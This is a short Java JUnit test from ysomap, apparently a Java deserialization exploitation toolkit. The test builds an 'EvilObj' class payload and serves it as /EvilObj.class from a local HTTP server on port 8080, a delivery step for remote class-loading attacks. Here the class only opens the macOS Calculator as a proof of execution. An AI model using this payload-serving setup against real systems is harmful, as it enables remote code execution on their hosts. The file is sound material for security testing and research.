package ysomap.core.exploit.http;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.gadget.payload.objects.EvilFileWrapper;

/**
 * @author wh1t3P1g
 * @since 2020/3/10
 */
public class SimpleHTTPServerTest {

    @Test
    public void work() throws Exception {
        Payload payload = new EvilFileWrapper();
        Bullet bullet = payload.getDefaultBullet("");
        bullet.set("classname","EvilObj");
        bullet.set("body","open /System/Applications/Calculator.app");
        bullet.set("type","class");
        payload.setBullet(bullet);
        SimpleHTTPServer server = new SimpleHTTPServer();
        server.set("lport", "8080");
        server.set("path","/EvilObj.class");
        server.set("payload", payload.getObject());
        server.run();
//        server.stop();
    }
}